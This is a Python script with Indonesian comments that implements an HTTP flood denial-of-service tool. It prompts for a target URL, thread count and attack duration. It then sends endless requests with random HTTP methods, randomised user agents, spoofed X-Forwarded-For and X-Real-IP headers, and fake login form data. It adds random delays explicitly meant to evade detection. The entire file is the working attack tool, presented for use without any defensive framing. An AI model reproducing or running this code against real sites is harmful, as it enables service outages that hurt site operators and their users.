import requests
import threading
import random
import time
import string
from fake_useragent import UserAgent
from datetime import datetime
from requests.exceptions import RequestException
import logging
import json
from urllib.parse import urlparse

# Menyiapkan logging untuk memantau hasil serangan
logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(message)s")
logger = logging.getLogger()

# Fungsi untuk menghasilkan string acak untuk payload
def generate_random_string(min_length=100, max_length=200):
    length = random.randint(min_length, max_length)
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

# Fungsi untuk spoof IP acak
def spoofed_ip():
    return f"{random.randint(1, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}"

# Fungsi untuk mendapatkan User-Agent acak
def get_random_user_agent():
    ua = UserAgent()
    return ua.random

# Fungsi untuk membuat header yang acak dan dinamis
def random_headers():
    user_agent = get_random_user_agent()
    accept_headers = [
        "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "application/json, text/javascript, */*; q=0.01",
        "*/*"
    ]
    referers = [
        "https://google.com", "https://example.com", "https://twitter.com", "https://facebook.com", "https://youtube.com"
    ]
    return {
        "User-Agent": user_agent,
        "X-Forwarded-For": spoofed_ip(),
        "Accept": random.choice(accept_headers),
        "Referer": random.choice(referers),
        "Connection": "keep-alive",
        "Cache-Control": "no-cache",
        "Pragma": "no-cache",
        "Upgrade-Insecure-Requests": "1",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "en-US,en;q=0.9",
        "DNT": "1",
        "X-Requested-With": "XMLHttpRequest",
        "Origin": "https://example.com",
        "X-Real-IP": spoofed_ip(),
        "Cache-Control": "max-age=0",
        "If-None-Match": generate_random_string(20, 30),
        "X-Content-Type-Options": "nosniff",
        "TE": "Trailers",
        "Expect": "100-continue",
        "X-Frame-Options": "SAMEORIGIN",
        "X-XSS-Protection": "1; mode=block",
        "Strict-Transport-Security": "max-age=31536000; includeSubDomains",
        "Referrer-Policy": "no-referrer-when-downgrade",
        "X-Powered-By": "PHP/7.3.5",
        "Cache-Control": "private, max-age=0",
        "Content-Type": "application/x-www-form-urlencoded"
    }

# Fungsi untuk membuat body permintaan POST acak
def generate_post_data():
    return {
        "username": generate_random_string(10, 15),
        "password": generate_random_string(12, 18),
        "email": generate_random_string(5, 10) + "@gmail.com"
    }

# Fungsi untuk membuat query string acak
def generate_query_string():
    params = {
        "id": generate_random_string(5, 10),
        "page": random.randint(1, 10),
        "action": random.choice(["view", "click", "load", "submit"]),
        "lang": random.choice(["en", "es", "fr", "de"]),
    }
    return '&'.join([f"{key}={value}" for key, value in params.items()])

# Fungsi untuk mengirimkan permintaan HTTP dengan berbagai metode
def send_request(target_url, method="GET"):
    payload = {"data": generate_random_string()}  # Payload acak untuk POST
    methods = ["GET", "POST", "PUT", "HEAD", "OPTIONS", "DELETE", "PATCH", "TRACE", "CONNECT", "LINK"]
    
    # Cek apakah URL membutuhkan query string
    if "?" not in target_url:
        target_url += "?" + generate_query_string()
    else:
        target_url += "&" + generate_query_string()

    while True:
        try:
            method = random.choice(methods)
            headers = random_headers()

            # Menggunakan metode HTTP acak
            if method == "GET":
                response = requests.get(target_url, headers=headers, timeout=5)
            elif method == "POST":
                data = generate_post_data()
                response = requests.post(target_url, data=data, headers=headers, timeout=5)
            elif method == "PUT":
                response = requests.put(target_url, data=payload, headers=headers, timeout=5)
            elif method == "HEAD":
                response = requests.head(target_url, headers=headers, timeout=5)
            elif method == "OPTIONS":
                response = requests.options(target_url, headers=headers, timeout=5)
            elif method == "DELETE":
                response = requests.delete(target_url, headers=headers, timeout=5)
            elif method == "PATCH":
                response = requests.patch(target_url, data=payload, headers=headers, timeout=5)
            elif method == "TRACE":
                response = requests.request("TRACE", target_url, headers=headers, timeout=5)
            elif method == "CONNECT":
                response = requests.request("CONNECT", target_url, headers=headers, timeout=5)
            elif method == "LINK":
                response = requests.request("LINK", target_url, headers=headers, timeout=5)

            # Menangani respons dari server
            if response.status_code == 200:
                logger.info(f"[+] {method} request sent | Status: {response.status_code} | IP: {headers['X-Forwarded-For']}")
            elif response.status_code == 301 or response.status_code == 302:
                logger.info(f"[+] Redirection detected | Status: {response.status_code}")
            elif response.status_code == 403:
                logger.warning(f"[-] Forbidden (403) detected! Trying different headers...")
            elif response.status_code == 404:
                logger.warning(f"[-] Page not found (404) - Skipping this request...")
            elif response.status_code == 500:
                logger.warning(f"[-] Server error (500) - Retrying...")
            else:
                logger.warning(f"[-] {method} request failed | Status: {response.status_code}")
        except RequestException as e:
            logger.error(f"[-] Error: {e}")

        # Random delay untuk menghindari deteksi
        time.sleep(random.uniform(0.1, 1.5))

# Fungsi utama untuk mengelola serangan
def http_flood(target_url, thread_count, attack_duration):
    threads = []
    for _ in range(thread_count):
        thread = threading.Thread(target=send_request, args=(target_url,))
        thread.daemon = True
        thread.start()
        threads.append(thread)

    try:
        logger.info(f"[+] Attack started at {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}! Running for {attack_duration} seconds...")
        time.sleep(attack_duration)
    except KeyboardInterrupt:
        logger.info("\n[!] Attack stopped by user.")
    finally:
        logger.info(f"[+] Attack finished at {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}.")

if __name__ == "__main__":
    target_url = input("Enter target URL: ")
    thread_count = int(input("Enter number of threads (recommend 100+): "))
    attack_duration = int(input("Enter attack duration (seconds): "))

    http_flood(target_url, thread_count, attack_duration)
